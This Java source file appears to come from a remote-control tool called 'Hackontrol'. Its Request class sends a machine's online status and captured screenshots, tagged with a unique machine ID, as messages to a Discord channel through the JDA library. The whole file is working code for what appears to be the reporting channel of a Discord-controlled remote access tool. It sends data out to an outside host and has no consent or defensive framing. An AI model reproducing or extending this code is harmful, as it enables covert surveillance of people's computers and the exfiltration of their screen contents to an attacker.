package com.khopan.hackontrol.network;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.khopan.hackontrol.MachineId;

import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.requests.restaction.MessageCreateAction;
import net.dv8tion.jda.api.utils.FileUpload;

public class Request {
	private final TextChannel channel;
	private final MachineId identifier;
	private final ObjectMapper mapper;

	public Request(TextChannel channel) {
		this.channel = channel;
		this.identifier = MachineId.get();
		this.mapper = new ObjectMapper();
	}

	public void statusReport(boolean online) {
		ObjectNode node = this.mapper.createObjectNode();
		node.put("online", online);
		this.request(RequestMode.STATUS_REPORT, node);
	}

	public void screenshotTaken(byte[] image) {
		this.request(RequestMode.SCREENSHOT_TAKEN, this.mapper.createObjectNode(), FileUpload.fromData(image, "screenshot.png"));
	}

	private void request(int requestMode, ObjectNode node, FileUpload... files) {
		node.put("requestMode", requestMode);
		node.put("machineId", this.identifier.getIdentifier());
		String message = node.toString();
		MessageCreateAction action = this.channel.sendMessage(message);

		if(files != null && files.length > 0) {
			action.addFiles(files);
		}

		action.queue();
	}
}
